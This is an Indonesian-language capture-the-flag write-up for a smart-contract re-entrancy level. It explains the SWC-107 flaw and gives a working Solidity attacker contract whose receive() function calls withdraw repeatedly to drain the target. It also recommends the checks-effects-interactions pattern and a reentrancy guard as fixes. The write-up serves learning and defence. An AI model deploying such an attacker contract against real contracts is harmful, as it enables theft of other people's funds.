## Re-entrancy — Level 10

### Alur Logika Contract
pada contract reentrancy ini ada safemath untuk uint256 dan ada 3 fungsi utama yaitu donate balanceOf dan withdraw namun ketika aku mencari tentang re entrancy dan ada analogi atm aku melihat pada function bahwa contract ini mengirim eth dahulu sebelum mengurangi amount untuk withdraw dan sepertinya itu celah nya yang bisa di manfaat kan di withdraw berulang ulang sebelum saldo di kurangi

### Vulnerability
Nama: SWC-107
Penjelasan:Salah satu bahaya utama dari pemanggilan kontrak eksternal adalah bahwa mereka dapat mengambil alih aliran kontrol. Dalam serangan masuk kembali (alias serangan panggilan rekursif), kontrak berbahaya memanggil kembali kontrak panggilan sebelum pemanggilan pertama fungsi selesai. Hal ini dapat menyebabkan pemanggilan fungsi yang berbeda berinteraksi dengan cara yang tidak diinginkan.

### Impact
penyerang dapat menguras uang di dalam contract dengan cara memanggil eithdraw berulang ulanng sampai saldo kontract habis dan saldo korban di kurangi

### Cara Eksploit
kita menggunakan contract penyerang untuk berinteraksi dengan contract korban agar dapat melakukan withdraw berulang sebelum saldo di kurangi contoh contrct penyerang nya seperti ini

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract reentrancyattack {
    address public alamattarget;
    uint256 public attackAmount;

    constructor(address _target) payable {
    alamattarget = _target;
}
    function donate() public payable {
    (bool success,) = alamattarget.call{value: msg.value}(
        abi.encodeWithSignature("donate(address)", address(this))
    );
    require(success, "donate failed");
}

    function withdrawAttack(uint256 amount) public {
    attackAmount = amount; 
    (bool sukses,) = alamattarget.call(
        abi.encodeWithSignature("withdraw(uint256)", amount)
    );
    require(sukses, "Pemicuan awal gagal");
}
 receive() external payable {
        if (alamattarget.balance > 0 ) {
            (bool sukses, ) = alamattarget.call(abi.encodeWithSignature("withdraw(uint256)", attackAmount));
            require(sukses, "Re-entrancy gagal");
        }
    }
}

### Rekomendasi Fix
Praktik terbaik untuk menghindari kelemahan Reentrancy adalah:

Pastikan semua perubahan status internal dilakukan sebelum panggilan dijalankan. Hal ini dikenal sebagai Pola 
"Cek-Efek-Interaksi"

Gunakan kunci reentrancy (yaitu. Penjaga Masuk Kembali OpenZeppelin).
